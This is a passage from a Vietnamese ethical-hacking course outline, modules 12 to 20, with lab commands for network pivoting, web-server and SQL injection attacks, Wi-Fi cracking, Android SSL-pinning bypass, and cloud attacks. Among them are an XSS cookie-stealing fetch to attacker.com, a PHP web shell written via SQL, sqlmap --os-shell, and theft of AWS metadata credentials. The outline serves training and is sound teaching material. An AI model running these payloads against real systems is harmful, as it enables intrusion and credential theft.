  - Đánh cắp Cookie qua lỗ hổng XSS: `fetch('http://attacker.com/steal?c=' + document.cookie)`.
  - Nạp cookie vào trình duyệt qua tiện ích Cookie-Editor để mạo danh phiên đăng nhập.
- **Active-Recall QA:**
  - *Hỏi:* Cờ cookie nào ngăn chặn mã JavaScript độc hại đọc giá trị của Cookie?
  - *Đáp:* Cờ `HttpOnly`.

---

### Module 12: Kỹ thuật Vượt qua Tường lửa, IDS/IPS & Honeypot (Evasion Techniques)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 12 - Evading IDS, Firewall and HoneyPots/`
- **Ánh xạ MITRE ATT&CK:** Defense Evasion: Impair Defenses (`T1562`), Protocol Tunneling (`T1572`).
- **Mục tiêu Sư phạm:** Cơ chế hoạt động của Snort/Suricata; kỹ thuật vượt rào cản mạng qua Tunneling và Obfuscation.
- **Góc nhìn Red Team:** Làm chủ kỹ thuật Pivot mạng nội bộ. Khi một máy bị chiếm quyền, biến máy đó thành bàn đạp (Pivot Point) bằng Chisel hoặc Ligolo-ng để thọc sâu vào các phân vùng mạng kín (Database VLAN, Management Network).
- **Thực hành Lab Walkthrough:**
  ```bash
  # Thiết lập Ligolo-ng để Pivot mạng nội bộ qua giao diện TUN ảo
  # Trên máy tấn công (Proxy Server):
  sudo ./proxy -selfcert -laddr 0.0.0.0:11601
  
  # Trên máy nạn nhân (Agent):
  ./agent -connect <attacker_ip>:11601 -ignore-cert
  
  # Thêm route mạng nội bộ trên máy tấn công:
  sudo ip route add 10.10.10.0/24 dev ligolo
  ```
- **Active-Recall QA:**
  - *Hỏi:* Kỹ thuật Living off the Land (LOLBAS) giúp né tránh phát hiện như thế nào?
  - *Đáp:* Bằng cách sử dụng chính các file thực thi nhị phân hợp pháp có sẵn của hệ điều hành (như `certutil.exe`, `bitsadmin.exe`, `powershell.exe`) để tải mã độc hoặc thực thi lệnh mà không mang thêm công cụ lạ vào máy.

---

### Module 13: Tấn công & Khai thác Máy chủ Web (Hacking Web Servers)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 13 - Hacking web Servers/`
- **Ánh xạ MITRE ATT&CK:** Initial Access: Exploit Public-Facing Application (`T1190`).
- **Mục tiêu Sư phạm:** Cấu hình sai trên Apache/Nginx/IIS; tấn công WebDAV; khai thác Directory Traversal.
- **Góc nhìn Red Team:** Máy chủ Web thường nằm ở vùng DMZ. Khai thác máy chủ Web là bàn đạp đầu tiên để tấn công mạng bên trong.
- **Thực hành Lab Walkthrough:**
  ```bash
  # Tấn công kiểm tra WebDAV với cadaver và davtest
  davtest -url http://192.168.1.100/webdav
  cadaver http://192.168.1.100/webdav
  # Tải webshell: put shell.php
  ```
- **Active-Recall QA:**
  - *Hỏi:* Phương thức HTTP nào được WebDAV sử dụng để tải tệp tin lên máy chủ?
  - *Đáp:* Phương thức `PUT`.

---

### Module 14: Tấn công Ứng dụng Web theo Chuẩn OWASP Top 10 (Web App Hacking)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 14 - Web Application Hacking.md`
- **Ánh xạ MITRE ATT&CK:** Initial Access: Exploit Public-Facing Application (`T1190`).
- **Mục tiêu Sư phạm:** Nắm vững toàn bộ 10 nhóm lỗ hổng OWASP Top 10: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Software/Data Integrity, Logging Failures, SSRF.
- **Góc nhìn Red Team:** Lỗ hổng Server-Side Request Forgery (SSRF) là vũ khí cực mạnh để tấn công môi trường Cloud (lấy cắp AWS Metadata token) hoặc truy cập các dịch vụ nội bộ (Redis, Elasticsearch) vốn không mở ra Internet.
- **Thực hành Lab Walkthrough:**
  - Khai thác SSRF truy xuất dịch vụ nội bộ qua Burp Suite: `http://target.com/fetch?url=http://127.0.0.1:6379`.
  - Khai thác Local File Inclusion (LFI) đọc file cấu hình: `../../../../etc/passwd` hoặc `php://filter/convert.base64-encode/resource=index.php`.
- **Active-Recall QA:**
  - *Hỏi:* Lỗ hổng nào giữ vị trí số 1 trong bảng xếp hạng OWASP Top 10 phiên bản 2021?
  - *Đáp:* Broken Access Control (Kiểm soát truy cập bị phá vỡ / IDOR).

---

### Module 15: Khai thác Chèn câu lệnh SQL chuyên sâu (SQL Injection)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 15 - SQL Injection.md`
- **Ánh xạ MITRE ATT&CK:** Initial Access: Exploit Public-Facing Application (`T1190`), Credential Access (`T1003`).
- **Mục tiêu Sư phạm:** Nguyên lý chèn câu lệnh SQL; phân biệt In-band, Blind (Boolean/Time) và Out-of-band SQLi.
- **Góc nhìn Red Team:** Khai thác SQLi không chỉ để đọc trộm dữ liệu, mà còn để leo quyền lên hệ điều hành thông qua ghi file Web Shell (`SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'`) hoặc thực thi lệnh hệ thống trên MSSQL qua thủ tục lưu trữ `xp_cmdshell`.
- **Thực hành Lab Walkthrough:**
  ```bash
  # Tự động hóa khai thác SQLi và chiếm shell hệ điều hành với sqlmap
  sqlmap -u "http://target.com/item.php?id=1" --dbms=mysql --dbs
  sqlmap -u "http://target.com/item.php?id=1" --os-shell
  ```
- **Active-Recall QA:**
  - *Hỏi:* Biện pháp phòng chống triệt để nhất đối với lỗ hổng SQL Injection là gì?
  - *Đáp:* Sử dụng Prepared Statements (Parameterized Queries) kết hợp ORM chuẩn hóa.

---

### Module 16: Tấn công Mạng không dây Wi-Fi (Wireless Network Hacking)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 16 - Wireless Networks.md`
- **Ánh xạ MITRE ATT&CK:** Initial Access: Wireless Compromise (`T1200`).
- **Mục tiêu Sư phạm:** Mã hóa WEP (IV reuse), WPA2 (4-Way Handshake / PMKID), WPA3. Kỹ thuật bắt gói và bẻ khóa khóa mạng không dây.
- **Góc nhìn Red Team:** Đột nhập vào trụ sở doanh nghiệp, dựng trạm phát sóng giả (Evil Twin) có tên giống hệt mạng công ty, phát bản tin Deauth làm rớt mạng nhân viên để lừa họ nhập mật khẩu Wi-Fi hoặc thông tin đăng nhập miền.
- **Thực hành Lab Walkthrough:**
  ```bash
  # 1. Bật monitor mode trên card Wi-Fi
  sudo airmon-ng start wlan0
  
  # 2. Bắt 4-way handshake
  sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/wifi_capture wlan0mon
  
  # 3. Gửi bản tin Deauthentication ép client kết nối lại
  sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
  
  # 4. Bẻ khóa mật khẩu bắt được
  aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/wifi_capture-01.cap
  ```
- **Active-Recall QA:**
  - *Hỏi:* Bốn bản tin trong quá trình bắt tay WPA2 dùng để thỏa thuận khóa mã hóa nào?
  - *Đáp:* Pairwise Transient Key (PTK).

---

### Module 17: Phân tích & Tấn công Ứng dụng Di động Android (Mobile Platform Hacking)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 17 - Mobile Platform/` | `03_Ethical_Hacking_Lab_Reports/ialb 17 Android_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Mobile Tactics: Insecure Data Storage, Insecure Communication.
- **Mục tiêu Sư phạm:** Cấu trúc tệp APK; dịch ngược mã nguồn Smali/Java; phát hiện lỗ hổng lưu trữ dữ liệu không an toàn.
- **Góc nhìn Red Team:** Tìm kiếm API keys, Hardcoded credentials, Endpoints bí mật bị nhà phát triển bỏ quên trong mã nguồn ứng dụng di động. Vượt qua cơ chế SSL Pinning để nghe lén API.
- **Thực hành Lab Walkthrough (Theo iLab 17):**
  ```bash
  # 1. Dịch ngược APK với jadx-gui
  jadx-gui target_app.apk
  
  # 2. Dùng Frida bypass SSL Pinning trên thiết bị Android
  frida -U -f com.target.app -l frida-ssl-bypass.js --no-pause
  ```
- **Active-Recall QA:**
  - *Hỏi:* File cấu hình quan trọng nhất khai báo toàn bộ quyền và thành phần của ứng dụng Android là gì?
  - *Đáp:* `AndroidManifest.xml`.

---

### Module 18: Tấn công Thiết bị IoT và Hệ thống Vận hành Công nghiệp (IoT & OT Hacking)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 18 - IOT Hacking/`
- **Ánh xạ MITRE ATT&CK:** Impact: Loss of Control, Inhibit Response Function.
- **Mục tiêu Sư phạm:** Kiến trúc IoT (Cảm biến, Gateway, Cloud); các giao thức MQTT, Zigbee, Modbus; khai thác Firmware.
- **Góc nhìn Red Team:** Các thiết bị IoT trong doanh nghiệp (Camera, Máy in, Thiết bị chấm công) thường có bảo mật kém, mật khẩu mặc định và không được cài EDR, là nơi lý tưởng để Red Team cắm chốt duy trì quyền truy cập bền bỉ (Persistence).
- **Thực hành Lab Walkthrough:**
  ```bash
  # Trích xuất hệ thống tệp từ firmware nhị phân bằng binwalk
  binwalk -e -M firmware.bin
  # Khảo sát tài khoản và mật khẩu cứng trong thư mục /etc/shadow vừa trích xuất
  grep -rn "root:" _firmware.bin.extracted/
  ```
- **Active-Recall QA:**
  - *Hỏi:* Giao thức truyền tin gọn nhẹ dạng Publish/Subscribe phổ biến nhất trong IoT là gì?
  - *Đáp:* Giao thức MQTT (Cổng tiêu chuẩn 1883 / 8883 có TLS).

---

### Module 19: Khai thác & Leo quyền trên Điện toán Đám mây (Cloud Security Hacking)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 19 - Cloud Computing/` | `03_Ethical_Hacking_Lab_Reports/ila 19 cloud security_vi.docx`
- **Ánh xạ MITRE ATT&CK:** Cloud Tactics: Cloud Infrastructure Discovery, Unused/Unsupported Cloud Regions.
- **Mục tiêu Sư phạm:** Mô hình IaaS, PaaS, SaaS; quản trị danh tính IAM; các lỗi cấu hình sai phổ biến trên AWS, Azure, GCP.
- **Góc nhìn Red Team:** Tấn công SSRF để truy vấn Endpoint Metadata cục bộ (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`) nhằm lấy AccessKey, SecretKey và Token của máy chủ EC2, từ đó chiếm quyền toàn bộ tài khoản Cloud.
- **Thực hành Lab Walkthrough (Theo iLab 19):**
  ```bash
  # Khai thác thông tin credentials từ AWS Metadata Service qua curl
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
  
  # Cấu hình aws-cli với thông tin vừa lấy cắp
  export AWS_ACCESS_KEY_ID="AKIA..."
  export AWS_SECRET_ACCESS_KEY="..."
  export AWS_SESSION_TOKEN="..."
  aws s3 ls
  ```
- **Active-Recall QA:**
  - *Hỏi:* Phiên bản AWS IMDSv2 khác gì so với IMDSv1 về cơ chế bảo vệ chống SSRF?
  - *Đáp:* IMDSv2 yêu cầu tạo Token phiên qua phương thức `PUT` kèm Header `X-aws-ec2-metadata-token-ttl-seconds` trước khi truy xuất dữ liệu, ngăn chặn hầu hết các cuộc tấn công SSRF đơn giản.

---

### Module 20: Mật mã học Ứng dụng & Kỹ thuật Phá mã (Cryptography in Red Teaming)
- **Tài liệu đối chiếu:** `CEH-Notes/Module 20 - Cryptography/`
- **Ánh xạ MITRE ATT&CK:** Credential Access, Defense Evasion.
- **Mục tiêu Sư phạm:** Mã hóa đối xứng (AES, DES) vs Bất đối xứng (RSA, ECC); Hàm băm (MD5, SHA-1, SHA-256); Hạ tầng khóa công khai PKI.
- **Góc nhìn Red Team:** Sử dụng mật mã để che giấu mã độc (Payload Encryption). Nhận diện các thuật toán mã hóa lỗi thời (DES, MD5, RC4) để thực hiện các cuộc tấn công bẻ khóa (Collision Attack, Downgrade Attack).
- **Thực hành Lab Walkthrough:**
  ```bash
  # Mã hóa payload C2 bằng AES-256-CBC qua OpenSSL
  openssl enc -aes-256-cbc -salt -in payload.bin -out payload.enc -k SecretKey123!
  
  # Giải mã payload trực tiếp trong bộ nhớ bằng script C#
  ```
- **Active-Recall QA:**
  - *Hỏi:* Sự khác biệt cơ bản giữa Mã hóa (Encryption) và Băm (Hashing) là gì?
  - *Đáp:* Mã hóa là quá trình hai chiều (có thể giải mã về bản rõ khi có khóa); Băm là quá trình một chiều không thể đảo ngược, dùng để xác thực tính toàn vẹn.

---

*Giáo án này được phân phối đồng bộ kèm theo hệ thống xuất PDF/DOCX và Ma trận móc nối tri thức. Giảng viên và học viên phải tuân thủ nghiêm ngặt quy tắc đạo đức nghề nghiệp và chỉ thực hành trong môi trường thí nghiệm được cấp phép.*
